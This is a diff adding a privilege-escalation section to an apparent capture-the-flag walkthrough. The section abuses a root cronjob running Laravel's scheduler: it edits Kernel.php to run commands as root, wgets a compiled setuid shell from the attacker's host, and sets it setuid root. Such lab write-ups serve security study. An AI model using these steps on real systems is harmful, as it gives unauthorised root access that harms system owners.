@@ -106,10 +106,67 @@ And we have a reverse shell session on the box!
 ## Privilege Escalation
 
 Uploading and starting the enumeration script **LinEnum.sh** and looking at the output we see a cronjob that we want to exploit.
-> * * * * *    root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+> \* \* \* \* \*    root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 
 The cronjob runs a Laravel command every minute as root and this can get us command execution as root.
 On the [Laravel documentation](https://laravel.com/docs/5.8/scheduling) about how the scheduled commands work and create our own commands.
 
+First we need to find the file **Kernel.php**:
+```markdown
+find / -iname Kernel.php 2>/dev/null
 
+/var/www/laravel/app/Console/Kernel.php
+```
 
+We will modify the schedule function in this file to create the file _test_ in the _/tmp_ directory:
+```php
+//(...)
+    protected function schedule(Schedule $schedule)
+    {
+        $schedule->exec('touch /tmp/test')->everyMinute(); //The line we add
+        // $schedule->command('inspire')
+        //          ->hourly();
+    }
+//(...)
+```
+
+After on minute the command gets automatically executed and file got created with root permissions.
+That means we can compile a TTY shell and execute it to start a session with root.
+
+We create a file named **shell.c** with this content:
+```c
+int main(void)
+{
+        setuid(0);
+        setgid(0);
+        system("/bin/bash");
+}
+```
+
+And compile it:
+```markdown
+gcc shell.c -o shell
+```
+
+Now we need to upload this shell on the box and make it executable: 
+```markdown
+# Downloading the binary on the box
+wget http://10.10.14.8:8000/shell
+
+# Making it executable
+chmod +x shell
+```
+
+And we need modify the _Kernel.php_ script to give it the setuid bit and change the owner to root, so it runs as root:
+```php
+//(...)
+    protected function schedule(Schedule $schedule)
+    {
+        $schedule->exec('chown root:root /tmp/shell; chmod 4755 /tmp/shell')->everyMinute();
+        // $schedule->command('inspire')
+        //          ->hourly();
+    }
+//(...)
+```
+
+After one minute it runs and we can run the binary and get a root shell!
